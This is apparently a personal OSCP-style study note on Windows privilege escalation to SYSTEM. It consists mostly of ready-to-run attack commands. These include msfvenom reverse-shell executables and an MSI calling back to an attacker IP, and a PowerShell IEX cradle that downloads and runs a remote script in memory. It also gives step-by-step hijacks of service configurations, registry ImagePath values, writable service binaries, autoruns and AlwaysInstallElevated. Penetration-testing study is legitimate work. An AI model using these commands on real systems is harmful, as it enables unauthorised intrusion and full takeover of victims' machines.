# Windows Escalation Paths
---------------------------

This document captures in my preparation journey various Escalation Paths in Windows to get to Authority \ System.  
A couple of golden resources that you need to be aware of and should be referenced frequently 
- [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Sushant's Blog](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [YouTube Link - Sagi Shahar](https://www.youtube.com/results?search_query=sagi+shahar)  



### Reverse Shell - Couple of Methods
--------------------------------------

1. **Method1** Generate a reverse shell executable through any standard payload 



> **msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe**



As a next step, host this through a simple Python Server or through **SMB share**. You know Python server, here is the command for SMB share



> **sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .**


Note that the SMB server has to be set up in the same folder where the reverse.exe is (just like python server)

On the Target Windows machine you need to run the following command


> **copy \\\\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe**

Replace 10.10.10.10 with whatever IP the attach machine has.

And then run the reverse.exe file on the victim machine



2. **Method2** Generating a Powershell session by invoking Nishang's Reverse Shell into the memory directly



In this scenario we create a reverse shell in 2 steps. The payload generated via MSFVENOM launches a CMD.EXE with a command to launch PowerShell that invokes IEX and connects to a hosting server (Python Server) the necessary Reverse Shell File. It invokes the Reverse Shell into memory and is thus executed directly and within script one can pass the reverse shell IP address & port and listen on it. 

Here is how we do it. 



> msfvenom -p windows/exec CMD="powershell \\"iex(New-Object Net.WebClient).downloadString('http://10.10.14.21/rev.ps1')\"" -o reverse_pshell.exe




In here we are generating an EXE file which then needs to be run at the target box.







### Escalation Path 1 - Kernel Exploits
----------------------------------------

Kernel exploits present a very powerful way to escalate your privileges as it works directly with a kernel. Normally, you run a binary/executable and that should give you some kind of escalation of privileges on the box. 

**Resources**
-------------
https://github.com/SecWiki/windows-kernel-exploits

**Methodology**
---------------
1. Get some kind of a shell as part of initial foothold. This will depend on how you intend to escalate
	- Metasploit - For this you can use a payload of **windows/meterpreter/reverse_tcp** and run a handler to catch the shell
	- Manual - For this you can use a payload of **windows/shell_reverse_tcp** and run a NETCAT listener to catch the shell

2. Do local enumeration with the obtained shell 

3. Check on Exploit suggester to see if Kernel exploits are available. In case if they are go to the resource mentioned in the link.

4. See the methodology to get an escalated session and escalate privileges




### Escalation Path 2 - Insecure Service Permissions
------------------------------------------------------


Use accesschk.exe to check for a given user's access on a suspicious service - something that will get flagged with PowerUp.ps1
Here the example service is: daclsvc



> **C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc**


Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):


> **sc qc daclsvc**



Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:


> **sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""**


Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:


> **net start daclsvc**

  







### Escalation Path 3 - Unquoted Service Paths
--------------------------------------------------


**Step 1:** Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.

> **sc qc unquotedsvc**



**Step 2:** Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:

> **C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"**



**Step 3:** Copy the reverse.exe executable you created to this directory and rename it Common.exe:



> **copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"**


**Step 4:** Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:


> **net start unquotedsvc**

  








### Escalation Path 4 - Weak Registry Permissions
---------------------------------------------------


**Step 1:** Query the culprit service (e.g. regsvc) and note that it run with SYSTEM privileges (SERVICE_START_NAME)

> **sc qc regsvc**



**Step 2:** Using accesschk.exe note that the registry entry for the culprit service (regsvc) is writable by "NT AUTHORIT\INTERACTIVE" - This group is essentiall all logged on users that include the current user

> **C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc**



**Step 3:** Overwrite the ImagePath Registry Key to point to reverse.exe

> **reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f**




**Step 4:** Listen on Netcat after starting the service

> **net start regsvc**
  
  
  
  


### Escalation Path 5 - Insecure Service Executables
------------------------------------------------------


**Step 1:** Query the culprit service (e.g. filepermsvc here) and note that it runs with SYSTEM privileges (SERVICE_START_NAME)


> **sc qc filepermsvc**



**Step 2:** Use accesschk.exe and note that the service binary (BINARY_PATH_NAME) file is writable by everyone

> **C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"**


**Step 3:** Copy the reverse.exe to the writable location

> **copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y**



**Step 4:** Start a listener and initiate the service

> **net start filepermsvc**

 




### Escalation Path 6 - Registry Autoruns
-------------------------------------------

  
**Step 1:** Query the registry for AutoRun executables
  
> **reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**



**Step 2:** Using Accesschk.exe for ascertaining whether any autorun file is writable by all users (in this case it is program.exe)


> **C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"**


**Step 3:** Copy the reverse.exe into the folder where the current writable autorun file exists and **"overwrite"** it with reverse.exe

> **copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y**


**Step 4:** Restart the box (if this is possible in the scenario provided and then wait for someone to log in!!)




### Escalation Path 7 - Registry (AllAlwaysInstallElevated)


**Step 1:** Query the Registry for AlwaysInstallElevated keys

> **reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**
> **reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**


**Step 2:** Note that both keys are set to 1 (0x01)



**Step 3:** On Kali generate a msi based reverse shell file using

> ** msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f msi -o reverse.msi**


**Step 4:** Transfer this reverse.msi file onto the Windows box



**Step 5:** Start a listener on Kali and then run the installer to trigger the reverse shell

> **msiexec /quiet /qn /i C:\PrivEsc\reverse.msi**










